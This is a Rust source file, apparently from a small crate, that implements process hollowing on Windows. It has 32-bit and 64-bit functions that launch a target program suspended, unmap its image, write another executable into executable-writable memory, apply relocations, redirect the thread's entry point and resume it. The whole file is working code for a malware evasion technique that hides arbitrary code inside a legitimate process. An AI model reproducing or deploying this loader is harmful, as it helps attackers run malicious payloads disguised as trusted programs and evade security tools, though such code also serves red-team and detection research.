#[macro_use]
extern crate bitfield;

pub mod pe;

use crate::pe::{
    read_image32, read_image64, read_remote_image32, read_remote_image64, get_image_base_address,
    X96, x96_check, x96_check_from_remote
};
use anyhow::*;
use ntapi::ntmmapi:: NtUnmapViewOfSection;
use winapi::shared::{
    ntdef::PVOID,
};
use winapi::um::{
    errhandlingapi::{ GetLastError },
    memoryapi::{ VirtualAllocEx, ReadProcessMemory, WriteProcessMemory },
    processthreadsapi::{
        CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, ResumeThread,
        GetThreadContext, SetThreadContext, // SuspendThread
    },
    winbase:: {
        CREATE_SUSPENDED,
        Wow64GetThreadContext, Wow64SetThreadContext
    },
    winnt:: {
        IMAGE_DIRECTORY_ENTRY_BASERELOC, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        CONTEXT, WOW64_CONTEXT, CONTEXT_FULL, WOW64_CONTEXT_FULL
    }
};

use std::fs::File;
use std::ffi::CString;
use std::mem::{ size_of, zeroed };
use std::io::prelude::*;
use std::ptr::null_mut;

const STATUS_SUCCESS: i32 = 0x0;

// ".reloc" binary
const DOT_RELOC: [u8; 8] = [46, 114, 101, 108, 111, 99, 0, 0];

#[repr(C)]
struct BASE_RELOCATION_BLOCK {
    PageAddress: u32,
    BlockSize: u32,
}

bitfield! {
    struct BASE_RELOCATION_ENTRY([u8]);
    impl Debug;
    u8;
    u16, offset, _: 11, 0;
    u8, block_type, _: 15, 12;
}

pub unsafe fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
    // Create dest process
    let mut startup = zeroed::<STARTUPINFOA>();
    let mut process_info = zeroed::<PROCESS_INFORMATION>();

    let dest = CString::new(dest.into()).expect("CString::new failed");
    CreateProcessA(null_mut(), dest.as_ptr() as *mut _, null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &mut startup, &mut process_info);

    // Get dest image, image_address
    let hp = process_info.hProcess;
    let mut dest_image_address = get_image_base_address(hp);

    // read src program and mapping
    let file_name = src.into();

    let mut f = File::open(&file_name).with_context(|| format!("could not opening the file: {}", &file_name))?;
    let mut buffer = Vec::new();
    f.read_to_end(&mut buffer).with_context(|| format!("could not reading from the file: {}", &file_name))?;

    let src_image = read_image32(&mut buffer[0] as *const _ as *mut _);

    // Unmapping image from dest process
    if NtUnmapViewOfSection(hp, dest_image_address as *mut _) != STATUS_SUCCESS {
        bail!("could not unmapping image from dest process. NtUnmapViewOfSection calling was failed.")
    };

    // Allocate memory for src program
    let src_nt_header = *src_image.FileHeader;
    let new_dest_image_address = VirtualAllocEx(
        hp, dest_image_address as *mut _, src_nt_header.OptionalHeader.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if new_dest_image_address as u64 == 0x0 as u64 {
        bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
    };

    dest_image_address = new_dest_image_address;

    // Delta relocation
    let delta_is_minus = src_nt_header.OptionalHeader.ImageBase as usize > dest_image_address as usize;
    let delta =
        if delta_is_minus {
            src_nt_header.OptionalHeader.ImageBase as usize - dest_image_address as usize
        }
        else {
            dest_image_address as usize - src_nt_header.OptionalHeader.ImageBase as usize
        };

    (*src_image.FileHeader).OptionalHeader.ImageBase = dest_image_address as u32;

    if WriteProcessMemory(
        hp, dest_image_address as *mut _, &mut buffer[0] as *const _ as *mut _,
        (*src_image.FileHeader).OptionalHeader.SizeOfHeaders as usize, null_mut()) == 0 {
        bail!("could not write process memory.");
    }

    let src_sections = std::slice::from_raw_parts(src_image.Sections, src_image.NumberOfSections as usize);

    for section in src_sections {

        let p_dest_section = dest_image_address as usize + section.VirtualAddress as usize;

        if WriteProcessMemory(
            hp, p_dest_section as *mut _, &mut buffer[section.PointerToRawData as usize] as *const _ as *mut _,
            section.SizeOfRawData as usize, null_mut()) == 0 {
            bail!("could not write process memory.");
        }
    }

    if delta != 0x0 {
        for section in src_sections {
            if section.Name != DOT_RELOC { continue }

            // rebase image flow
            let reloc_address = section.PointerToRawData as u64;
            let mut offset = 0 as u64;
            let reloc_data = (*src_image.FileHeader).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

            while offset < reloc_data.Size as u64 {
                let block_header = std::ptr::read::<BASE_RELOCATION_BLOCK>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _);

                offset = offset + std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u64;

                // 2 is relocation entry size.
                // ref: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
                let entry_count = (block_header.BlockSize - std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u32) / 2;

                let block_entry = std::slice::from_raw_parts::<[u8; 2]>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _, entry_count as usize);

                for block in block_entry {
                    let block = BASE_RELOCATION_ENTRY(*block);

                    offset = offset + 2;

                    if block.block_type() == 0 { continue }

                    let field_address = block_header.PageAddress as u64 + block.offset() as u64;

                    let mut d_buffer = 0 as u64;

                    if ReadProcessMemory(
                        hp, (dest_image_address as u64 + field_address) as PVOID,
                        &mut d_buffer as *const _ as *mut _, size_of::<u64>(), null_mut()) == 0 {
                            bail!("could not read memory from new dest image.")
                    }

                    d_buffer =
                        if delta_is_minus {
                            d_buffer - delta as u64
                        }
                        else {
                            d_buffer + delta as u64
                        };

                    if WriteProcessMemory(
                        hp, (dest_image_address as u64 + field_address) as PVOID,
                        &mut d_buffer as *const _ as *mut _, size_of::<u64>(), null_mut()) == 0 {
                            bail!("could not write memory to new dest image.")
                    }
                }
            }
        }
    }

    // create context, and change entry point
    let entry_point = dest_image_address as u64 + (*src_image.FileHeader).OptionalHeader.AddressOfEntryPoint as u64;
    let mut context = zeroed::<WOW64_CONTEXT>();
    context.ContextFlags = WOW64_CONTEXT_FULL;

    if Wow64GetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
        bail!("could not get thread context: {}", GetLastError());
    }

    context.Eax = entry_point as u32;

    if Wow64SetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
        bail!("could not set thread context: {}", GetLastError());
    }

    // Resume thread
    if ResumeThread(process_info.hThread) == u32::MAX {
        bail!("could not set thread context: {}", GetLastError());
    }

    // remove debug print
    println!("process was hollowed ε٩(๑> 3 <)۶з");

    Ok(())
}

pub unsafe fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
    // Create dest process
    let mut startup = zeroed::<STARTUPINFOA>();
    let mut process_info = zeroed::<PROCESS_INFORMATION>();

    let dest = CString::new(dest.into()).expect("CString::new failed");
    CreateProcessA(null_mut(), dest.as_ptr() as *mut _, null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &mut startup, &mut process_info);

    // Get dest image, image_address
    let hp = process_info.hProcess;
    let mut dest_image_address = get_image_base_address(hp);

    //let dest_image = read_remote_image32(hp, dest_image_address)?;

    // this did not worked, i guess image =/= not image_base_address so
    // println!("Architecture: {:?}", x96_check(&mut image));

    // read src program and mapping
    let file_name = src.into();

    let mut f = File::open(&file_name).with_context(|| format!("could not opening the file: {}", &file_name))?;
    let mut buffer = Vec::new();
    f.read_to_end(&mut buffer).with_context(|| format!("could not reading from the file: {}", &file_name))?;

    // as example, sample.exe is 64bit so expect Architecture output is X96::X64
    // then at here, using read_image64
    // and need to pass buffer[0], not buffer. becase &buffer is Vec struct pointer.
    // arg pointer should be buffer's first pointer so
    // btw, "&mut buffer[0] as *const _ as *mut _" is ugly, i have to change better code...
    let src_image = read_image64(&mut buffer[0] as *const _ as *mut _);

    // Unmapping image from dest process
    if NtUnmapViewOfSection(hp, dest_image_address as *mut _) != STATUS_SUCCESS {
        bail!("could not unmapping image from dest process. NtUnmapViewOfSection calling was failed.")
    };

    // Allocate memory for src program
    let src_nt_header = *src_image.FileHeader;
    let new_dest_image_address = VirtualAllocEx(
        hp, dest_image_address as *mut _, src_nt_header.OptionalHeader.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if new_dest_image_address as u64 == 0x0 as u64 {
        bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
    };

    dest_image_address = new_dest_image_address;

    // Delta relocation
    let delta_is_minus = src_nt_header.OptionalHeader.ImageBase as usize > dest_image_address as usize;
    let delta =
        if delta_is_minus {
            src_nt_header.OptionalHeader.ImageBase as usize - dest_image_address as usize
        }
        else {
            dest_image_address as usize - src_nt_header.OptionalHeader.ImageBase as usize
        };

    (*src_image.FileHeader).OptionalHeader.ImageBase = dest_image_address as u64;

    if WriteProcessMemory(
        hp, dest_image_address as *mut _, &mut buffer[0] as *const _ as *mut _,
        (*src_image.FileHeader).OptionalHeader.SizeOfHeaders as usize, null_mut()) == 0 {
        bail!("could not write process memory.");
    }

    let src_sections = std::slice::from_raw_parts(src_image.Sections, src_image.NumberOfSections as usize);

    for section in src_sections {

        let p_dest_section = dest_image_address as usize + section.VirtualAddress as usize;

        if WriteProcessMemory(
            hp, p_dest_section as *mut _, &mut buffer[section.PointerToRawData as usize] as *const _ as *mut _,
            section.SizeOfRawData as usize, null_mut()) == 0 {
            bail!("could not write process memory.");
        }
    }

    if delta != 0x0 {
        for section in src_sections {
            if section.Name != DOT_RELOC { continue }

            // rebase image flow
            let reloc_address = section.PointerToRawData as u64;
            let mut offset = 0 as u64;
            let reloc_data = (*src_image.FileHeader).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

            while offset < reloc_data.Size as u64 {
                let block_header = std::ptr::read::<BASE_RELOCATION_BLOCK>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _);

                offset = offset + std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u64;

                // 2 is relocation entry size.
                // ref: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
                let entry_count = (block_header.BlockSize - std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u32) / 2;

                let block_entry = std::slice::from_raw_parts::<[u8; 2]>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _, entry_count as usize);

                for block in block_entry {
                    let block = BASE_RELOCATION_ENTRY(*block);

                    offset = offset + 2;

                    if block.block_type() == 0 { continue }

                    let field_address = block_header.PageAddress as u64 + block.offset() as u64;

                    let mut d_buffer = 0 as u64;

                    if ReadProcessMemory(
                        hp, (dest_image_address as u64 + field_address) as PVOID,
                        &mut d_buffer as *const _ as *mut _, size_of::<u64>(), null_mut()) == 0 {
                            bail!("could not read memory from new dest image.")
                    }

                    d_buffer =
                        if delta_is_minus {
                            d_buffer - delta as u64
                        }
                        else {
                            d_buffer + delta as u64
                        };

                    if WriteProcessMemory(
                        hp, (dest_image_address as u64 + field_address) as PVOID,
                        &mut d_buffer as *const _ as *mut _, size_of::<u64>(), null_mut()) == 0 {
                            bail!("could not write memory to new dest image.")
                    }
                }
            }
        }
    }

    // create context, and change entry point
    let entry_point = dest_image_address as u64 + (*src_image.FileHeader).OptionalHeader.AddressOfEntryPoint as u64;
    let mut context = zeroed::<CONTEXT>();
    context.ContextFlags = CONTEXT_FULL;

    if GetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
        bail!("could not get thread context: {}", GetLastError());
    }

    context.Rip = entry_point;

    if SetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
        bail!("could not set thread context: {}", GetLastError());
    }

    // Resume thread
    if ResumeThread(process_info.hThread) == u32::MAX {
        bail!("could not set thread context: {}", GetLastError());
    }

    // remove debug print
    println!("process was hollowed ε٩(๑> 3 <)۶з");

    Ok(())
}
